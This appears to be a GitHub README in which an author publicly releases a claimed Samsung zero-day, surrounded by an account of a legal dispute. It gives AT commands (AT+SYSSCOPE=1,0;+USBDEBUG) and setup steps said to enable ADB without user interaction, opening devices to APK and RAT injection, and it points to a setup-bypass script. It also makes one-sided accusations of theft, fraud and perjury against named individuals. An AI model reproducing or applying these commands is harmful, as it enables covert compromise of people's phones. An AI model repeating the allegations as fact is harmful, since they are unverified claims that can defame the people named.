
# ADB 0-Day Exploit
# Enable ADB Samsung Verizon Devices
### Author: Jonathan Scott aka Jonathan Villarreal  @jonathandata1
### Date: October 19th, 2021
![Android ADB Enable Zero-Day](https://i.postimg.cc/YC10gg64/Untitled-design-Max-Quality-2021-10-19-T135934-479.jpg)

## Overview
#### In 2018 I was asked by Javier Villarreal of Verizon Wireless working in XPO Logistics to create a solution for all Samsung devices that would bypass Google's security and enable android debug bridge  without any human interaction. I was introduced to Javier Villarreal by a man named Jerry Forttenberry who I knew from Mannapov, LLC where I was Principal Engineer.  

#### My name is Jonathan Villarreal, I am in the process of legally changing my last name to Jonathan Scott. I want nothing to do with this last name the amount out people involved with this fraud with this last name, and how many family has disowned me because of the lies and the fraud sickens me every time I see the name Villarreal attached to my name.

#### I have been very public and open about everything that has been happening. 

#### I am the owner of Zroblack, LLC a security engineering firm that sold Zero-Day exploits that are currently in the wild all around the world. All of my exploits have been stolen by John Edward Saenz, my cousin-in-law whom I had not seen since I was 11 years old, $750,000 was stolen from my company as well. I was forced to sign a release or John Edward Saenz said he would "muck up my life"... The Texas Western District Court is upholding this release that was signed in duress, and allowing this technology that I created to be taken and used by John Edward Saenz in any way that he pleases. 

JOHN EDWARD SAENZ
![John Edward Saenz](https://i.postimg.cc/8c174bSX/LTUQb-Yl-P-400x400.jpg)


#### False testimony has been submitted by Steven Broderhausen acting as a forensics expert "proving" to the court that the technology I have developed does not exist, and has never existed on my company laptop, purchased by my company Zroblack's credit card, and registered in Apple Business under my company name. John Edward Saenz has lied underoath with the help of his defense attorney's from Dykema claiming that the laptop in question even though it was purchased with company funds was his personal use computer and never contained any code, schematics, patent drawings, or anything ever related to Zroblack, LLC including emails, pdf documents, and more. 

https://www.linkedin.com/posts/jonathan-scott-2ab05821a_cybersecurity-cyber-infosec-activity-6847009373210910720-Z2K-

https://twitter.com/jonathandata1/status/1441233668047966211?s=20

## My court case is: Villareal v. Saenz, 5-20-CV-00571-OLG-RBF

#### This case goes goes deeper than anyone knows and I will no longer stay silent about it. 
#### The courts have dismissed all but 1 claim in my case, 100% completely dismissing the sealed part of my court case that involves KNOWN Vulnerabilities in the 2020 US Census. 

https://twitter.com/jonathandata1/status/1449583265694822402?s=20

> Please check my twitter feed for more information, I have been
> speaking about this  openly because If the courts, and Blancco
> Technology Group are not going to protect the technology, I am
> releasing it to everyone so that we can have a fighting chance!
> 
> This is one of many Zero-Day's I will be releasing in order to make
> the public aware of an industry that exists in which Zero-Day exploits
> are being sold for billions of USD under the cover of "phone repair
> tech"
> 
> We wonder how spyware like Pegasus is so rampant in the world...it is
> because engineers like me are contracted to open holes in all kinds of
> systems, and then these zero-days are distributed around the world. 
> 
> https://twitter.com/jonathandata1/status/1449723687935127556?s=20
> 
> T**he first hour of my story you can listen to here and on Spotify.**
> 
> https://podcasts.apple.com/us/podcast/we-are-speaking-about-your-privacy-and-your/id1446317273?i=1000538889946
> 
>The last 5 minutes of this podcast has been cut off, but here is the document I speak about
>https://twitter.com/jonathandata1/status/1449994610495967234?s=20
> 
> #### I have to thank Alberto Daniel Hill whom has become family to me. He has been helping me get my message out, and get my story out,
> Alberto has been through more injustice than I can ever imagine, but
> yet is selflessly helping me, I encourage you to listen to his story
> on Darknet Diaries Episode 25.  
> 
> https://twitter.com/ADanielHill
> 
> https://twitter.com/jonathandata1/status/1449832445294043146?s=20

## Setup & Discussion

 1. `brew install android-platform-tool`
 2. Make sure adb is running in the background or you will not see the RSA prompt show up on the screen

 ## The Exploit

1. `AT+SYSSCOPE=1,0`
2. `AT+USBDEBUG`

#### As time progressed I simplified this exploit down to 2 AT Commands. These AT Commands can actually be combined into 1 string

    AT+SYSSCOPE=1,0;+USBDEBUG
 
This exploit can be executed on a Samsung galaxy device that is not setup yet, opening the device up to apk injection, binary injection, and RAT injection without the user ever knowing. 

The video I created for Verizon as they asked me is here. I posted it unlisted in 2019 to demonstrate for Blancco Technology group in Jan 2019 at a private event in Salt Lake City Utah. 

Please read the description in the video, and notice at the end that all those devices are Verizon Wireless Devices. 
https://www.youtube.com/watch?v=Q-HVtpCHA4c


## Ok so lets establish the official setup for this PoC
1. Ensure ADB is running in the background
2. There is no special hardware needed
3. There is no rooting required
4. You must be knowledgeable on how to execute AT Commands. I have written a program I call ATSEND that will help you execute these commands easily on Mac and Linux
5. https://github.com/jonathandata1/atsend
6. Sending the AT Commands Will Also help you send coordinated screen presses that will give you the ability to tap anyone on the screen WITHOUT needing ADB. This will allow you grant RSA Access to the device without ever needing to touch the device. 
7. My PoC in the video shows this being possible for 4 devices all at the same time....but I tested this on a custom USB rig that will allow for 200 devices at a time. 
8. This will work on Samsung Galaxy Phones 4.4.4 and higher, Tablets, and Watches
9. Bypassing the setup screen is easy at this point now...
10. Please see adb_aos_bypass.sh

![Android ADB Enable Zero-Day](https://i.postimg.cc/YSsM4fnB/Screen-Shot-2021-10-19-at-3-02-07-PM.png)

https://www.youtube.com/watch?v=Q-HVtpCHA4c

Patent Files & Description are here in the repository. Submitted and drafted by McCathern Lawfirm out of Dallas Texas. This is also one of the things that was stolen, so again, if the Texas Western District Court is going to allow technology like this to be stolen...The People Must Know



